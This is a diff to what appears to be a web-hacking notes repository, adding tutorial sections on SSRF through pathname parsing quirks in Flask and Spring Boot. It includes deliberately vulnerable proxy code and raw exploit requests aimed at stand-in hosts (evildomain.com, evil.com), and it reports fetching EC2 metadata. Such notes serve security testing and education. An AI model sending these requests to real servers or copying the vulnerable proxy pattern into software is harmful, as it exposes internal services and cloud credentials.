@@ -319,11 +319,90 @@ Example of a PDF attachment using HTML
 3. use `pdfdetach -saveall filename.pdf` to extract embedded resource
 4. cat `attachment.bin`
 
+# SSRF on Flask Through Incorrect Pathname Interpretation
+Flask accepts certain characters that it shouldn't. As an example, the following HTTP request, which should be considered invalid, is surprisingly treated as valid by the framework, but the server responds 404 Not Found:
+```html
+GET @/ HTTP/1.1
+Host: target.com
+Connection: close
+```
+Below is an example of the code:
+```python
+from flask import Flask
+from requests import get
+
+app = Flask('__main__')
+SITE_NAME = 'https://google.com/'
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def proxy(path):
+  return get(f'{SITE_NAME}{path}').content
+
+app.run(host='0.0.0.0', port=8080)
+```
+"What if the developer forgets to add the last slash in the SITE_NAME variable?". And yes, it can lead to an **SSRF**.
+Since Flask also allows any ASCII character after the `@`, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.
+
+Please consider the following source code as a reference for the exploitation scenario:
+```python
+from flask import Flask
+from requests import get
+
+app = Flask('__main__')
+SITE_NAME = 'https://google.com'
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+
+def proxy(path):
+  return get(f'{SITE_NAME}{path}').content
+
+if __name__ == "__main__":
+    app.run(threaded=False)
+```
+
+Presented below is an example of an exploitation request:
+```html
+GET @evildomain.com/ HTTP/1.1
+Host: target.com
+Connection: close
+```
+In the following example, I was able to fetch my EC2 metadata:
+![ssrf-flask](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/529505bd-4b79-4ad4-8317-546f0a72e9a4)
+
+# SSRF on Spring Boot Through Incorrect Pathname Interpretation
+Spring framework accepts the matrix parameter separator character `;` before the **first slash** of the HTTP pathname:
+
+```html
+GET ;1337/api/v1/me HTTP/1.1
+Host: target.com
+Connection: close
+```
+
+If a developer implements a server-side request that utilizes the complete pathname of the request to fetch an endpoint, it can lead to the emergence of **Server-Side Request Forgery (SSRF)**.
+
+Please consider the following source code as a reference for the exploitation scenario:
+
+![ssrf-2](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/fb40bae1-ba78-4631-b4ab-4937725ce382)
+
+The code snippet above utilizes the `HttpServletRequest` API to retrieve the requested URL through the `getRequestURI()` function. Subsequently, it concatenates the requested URI with the destination endpoint **ifconfig.me**.
+
+Considering that Spring permits any character following the Matrix parameter separator, becoming possible to use the `@` character to fetch an arbitrary endpoint as well.
+
+Below is an example of the exploit request:
+
+```html
+GET ;@evil.com/url HTTP/1.1
+Host: target.com
+Connection: close
+```
+![ssrf-3](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/c3486635-b964-49c8-8882-300a75e0931b)
+
+
 
 # SSRF at a glance
 [SSRF (Server-Side Request Forgery ).pdf](https://github.com/Mehdi0x90/Web_Hacking/files/12438160/SSRF.Server-Side.Request.Forgery.pdf)
-
-
 
 
 # Tools
